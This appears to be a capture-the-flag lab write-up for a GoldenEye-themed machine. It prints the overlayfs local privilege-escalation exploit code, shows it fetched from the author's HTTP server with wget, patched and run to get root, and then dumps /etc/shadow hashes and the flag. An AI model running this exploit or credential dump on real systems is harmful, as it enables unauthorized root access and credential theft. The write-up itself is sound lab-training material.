    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
            exit(-1);
        }
        file = ".access";
        chmod("/tmp/ns_sploit/work/work",0777);
    } else file = "ns_last_pid";

    chdir("/tmp/ns_sploit/o");
    rename(file,"ld.so.preload");

    chdir("/");
    umount("/tmp/ns_sploit/o");
    fprintf(stderr,"mount #2\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
            exit(-1);
        }
        chmod("/tmp/ns_sploit/work/work",0777);
    }

    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
    umount("/tmp/ns_sploit/o");
}

int
main(int argc, char **argv)
{
    int status, fd, lib;
    pid_t wrapper, init;
    int clone_flags = CLONE_NEWNS | SIGCHLD;

    fprintf(stderr,"spawning threads\n");

    if((wrapper = fork()) == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespace\n");

        if((init = fork()) == 0) {
            pid_t pid =
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
            if(pid < 0) {
                fprintf(stderr, "failed to create new mount namespace\n");
                exit(-1);
            }

            waitpid(pid, &status, 0);

        }

        waitpid(init, &status, 0);
        return 0;
    }

    usleep(300000);

    wait(NULL);

    fprintf(stderr,"child threads done\n");

    fd = open("/etc/ld.so.preload",O_WRONLY);

    if(fd == -1) {
        fprintf(stderr,"exploit failed\n");
        exit(-1);
    }

    fprintf(stderr,"/etc/ld.so.preload created\n");
    fprintf(stderr,"creating shared library\n");
    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
    write(lib,LIB,strlen(LIB));
    close(lib);
    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
    if(lib != 0) {
        fprintf(stderr,"couldn't create dynamic library\n");
        exit(-1);
    }
    write(fd,"/tmp/ofs-lib.so\n",16);
    close(fd);
    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
    execl("/bin/su","su",NULL);
}   

www-data@ubuntu:/tmp$ which gcc
which gcc
www-data@ubuntu:/tmp$ which cc
which cc
/usr/bin/cc

┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8000        
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.146.26 - - [03/Feb/2023 15:23:59] "GET /37292.c HTTP/1.1" 200 -

www-data@ubuntu:/tmp$ wget http://10.8.19.103:8000/37292.c
wget http://10.8.19.103:8000/37292.c
--2023-02-03 12:23:59--  http://10.8.19.103:8000/37292.c
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: '37292.c'

100%[======================================>] 4,968       --.-K/s   in 0.002s  

2023-02-03 12:24:00 (1.90 MB/s) - '37292.c' saved [4968/4968]

www-data@ubuntu:/tmp$ gcc 37292.c -o ofs
gcc 37292.c -o ofs
The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
www-data@ubuntu:/tmp$ sed -i "s/gcc/cc/g" 37292.c
sed -i "s/gcc/cc/g" 37292.c
www-data@ubuntu:/tmp$ cc 37292.c -o ofs
cc 37292.c -o ofs
37292.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
37292.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
37292.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
37292.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
37292.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
www-data@ubuntu:/tmp$ ./ofs
./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
whoami
root

# cd /root
cd /root
# ls
ls
# ls -lah
ls -lah
total 44K
drwx------  3 root root 4.0K Apr 29  2018 .
drwxr-xr-x 22 root root 4.0K Apr 24  2018 ..
-rw-r--r--  1 root root   19 May  3  2018 .bash_history
-rw-r--r--  1 root root 3.1K Feb 19  2014 .bashrc
drwx------  2 root root 4.0K Apr 28  2018 .cache
-rw-------  1 root root  144 Apr 29  2018 .flag.txt
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root 1.0K Apr 23  2018 .rnd
-rw-------  1 root root 8.2K Apr 29  2018 .viminfo
# cat .flag.txt
cat .flag.txt
Alec told me to place the codes here: 

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/

cat .bash_history
exit
ifconfig
exit
# ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 02:67:98:7d:e6:0d  
          inet addr:10.10.146.26  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::67:98ff:fe7d:e60d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:90457 errors:0 dropped:0 overruns:0 frame:0
          TX packets:89209 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:5611866 (5.6 MB)  TX bytes:6818299 (6.8 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:10804 errors:0 dropped:0 overruns:0 frame:0
          TX packets:10804 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:6088920 (6.0 MB)  TX bytes:6088920 (6.0 MB)

# cat /etc/shadow
cat /etc/shadow
root:$6$8j7iNdfv$OQJGo.QQtOiENSv3HfLPMckpLONudYqFMzAMBKBEBUEcDgQo7PcrKYrZcEgjmjH3IryZadnpkHQYqCwROkLWX0:17649:0:99999:7:::
daemon:*:16273:0:99999:7:::
bin:*:16273:0:99999:7:::
sys:*:16273:0:99999:7:::
sync:*:16273:0:99999:7:::
games:*:16273:0:99999:7:::
man:*:16273:0:99999:7:::
lp:*:16273:0:99999:7:::
mail:*:16273:0:99999:7:::
news:*:16273:0:99999:7:::
uucp:*:16273:0:99999:7:::
proxy:*:16273:0:99999:7:::
www-data:*:16273:0:99999:7:::
backup:*:16273:0:99999:7:::
list:*:16273:0:99999:7:::
irc:*:16273:0:99999:7:::
gnats:*:16273:0:99999:7:::
nobody:*:16273:0:99999:7:::
libuuid:!:16273:0:99999:7:::
syslog:*:16273:0:99999:7:::
messagebus:*:17645:0:99999:7:::
boris:$1$Q$1Ncm6RjHV/mXc9WX41JkU1:17645:0:99999:7:::
dovecot:*:17645:0:99999:7:::
dovenull:*:17645:0:99999:7:::
postfix:*:17645:0:99999:7:::
postgres:*:17645:0:99999:7:::
natalya:$6$EYZISgHO$S/U.7HifU.96lbOkZkeGky7AsmPKEEgoP2RLmztk635uVfzuRkGrom9X6gOnoivHsnO1x2822cTsH6w2GFRWG/:17646:0:99999:7:::
doak:$6$UrICgO36$gORwXyIypiMjPVdQa5wb1SQKcL27oNIHdjhBSGV8XX2m4F.oyRwiQOxcfUfQjPjzNL/UwcVXfNFzmKk5LEqXs1:17646:0:99999:7:::


view-source:http://10.10.146.26/006-final/xvf7-flag/

<html>
<head>

<link rel="stylesheet" href="index.css">
</head>


<video poster="val.jpg" id="bgvid" playsinline autoplay muted loop>

<source src="key.webm" type="video/webm">


</video>
<div id="golden">
<h1>Flag Captured</h1>
<p>Congrats! ******************************* </p>
<p>You've captured the codes! And stopped Alec Trevelyan from his indestructible vengeance!!!!</p>
<p>****************************************</p>
</div>


<script src="index.js"></script>
</html>

var vid = document.getElementById("bgvid");
var pauseButton = document.querySelector("#polina button");

if (window.matchMedia('(prefers-reduced-motion)').matches) {
    vid.removeAttribute("autoplay");
    vid.pause();
    pauseButton.innerHTML = "Paused";
}

function vidFade() {
  vid.classList.add("stopfade");
}

vid.addEventListener('ended', function()
{
// only functional if "loop" is removed 
vid.pause();
// to capture IE10
vidFade();
}); 


pauseButton.addEventListener("click", function() {
  vid.classList.toggle("stopfade");
  if (vid.paused) {
    vid.play();
    pauseButton.innerHTML = "Pause";
  } else {
    vid.pause();
    pauseButton.innerHTML = "Paused";
  }
})



```


Download the [linuxprivchecker](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123) to enumerate installed development tools.

To get the file onto the machine, you will need to wget your local machine as the VM will not be able to wget files on the internet. Follow the steps to get a file onto your VM:

-   Download the linuxprivchecker file locally
-   Navigate to the file on your file system
-   Do: **python -m SimpleHTTPServer 1337** (leave this running)
-   On the VM you can now do: wget /.py

**OR**

Enumerate the machine manually.

 Completed

Whats the kernel version?  

uname -a

*3.13.0-32-generic*

This machine is vulnerable to the overlayfs exploit. The exploitation is technically very simple:

-   Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags.
-   Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.
-   Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.
-   Make su on overlayfs world writable without changing the owner
-   Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.
-   Execute the modified su binary

You can download the exploit from here: [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)  

 Completed

Fix the exploit to work with the system you're trying to exploit. Remember, enumeration is your key!

What development tools are installed on the machine?  

Its a VERY simple fix. You're only changing 1 character...

 Completed

This is located in the root user folder.

What is the root flag?

![](https://i.imgur.com/qtALFwb.gif)


*568628e0d993b1973adc718237da6e93*

![[Pasted image 20230203152938.png]]

[[Holo]]